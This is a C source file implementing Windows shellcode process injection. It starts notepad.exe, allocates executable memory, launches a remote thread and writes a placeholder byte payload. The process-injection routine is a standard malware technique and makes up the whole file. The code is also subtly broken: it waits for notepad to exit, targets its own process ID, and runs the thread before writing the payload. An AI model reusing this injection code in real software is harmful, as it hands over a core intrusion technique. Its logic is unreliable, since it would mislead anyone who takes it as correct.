
#include "box.h"


int OpenNotepad() {

	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	DWORD PID = NULL, TID = NULL;
	PVOID rBuffer = NULL;

	unsigned char shell[] = "\x41\x41\x41\x41\x41\x41";
	size_t shellSize = sizeof(shell);


	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processinfo;
	LPCWSTR path = L"C:\\Windows\\system32\\notepad.exe";

	printf("[+] Creating Process! \n");
	if (CreateProcess(path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &info, &processinfo))
	{
		printf("Waiting for Process to execute... \n");
		WaitForSingleObject(processinfo.hProcess, INFINITE);
		DWORD PID = GetCurrentProcessId();

		printf("[+] PID Aquired! %ld \n", PID);
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

		rBuffer = VirtualAllocEx(hProcess, NULL, shellSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
		printf("[+] Allocated %zd-bytes to the process memory \n", shellSize);

		hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, TID);

		WriteProcessMemory(hProcess, rBuffer, shell, shellSize, NULL);
		printf("[+] Wrote shellcode to allocated buffer");
	}
	else
	{
		printf("CreateProcess failed (%ld). \n", GetLastError());
		return EXIT_FAILURE;
	}

	if (hProcess == NULL)
	{
		printf("[-] Failed to get a handle to the process %ld \n", GetLastError());
		return EXIT_FAILURE;
	}

	if (hThread == NULL)
	{
		printf("[-] Failed to get a handle to the Thread %ld \n", GetLastError());
		return EXIT_FAILURE;
	}

	if (rBuffer == NULL)
	{
		printf("[-] Failed to allocate buffer, error: %ld", GetLastError());
		return EXIT_FAILURE;
	}

	printf("[i] Got a handle to the newly-created thread (%ld)\n\\---0x%p\n", TID, hProcess);

	printf("[i] Waiting for thread to finish executing \n");
	WaitForSingleObject(hThread, INFINITE);
	printf("[+] Thread has finished executing! Cleaning up....");

	printf("Process Finished! Closing handles! \n");
	CloseHandle(hProcess);
	CloseHandle(hThread);
	CloseHandle(processinfo.hProcess);
	CloseHandle(processinfo.hThread);

	return EXIT_SUCCESS;
}
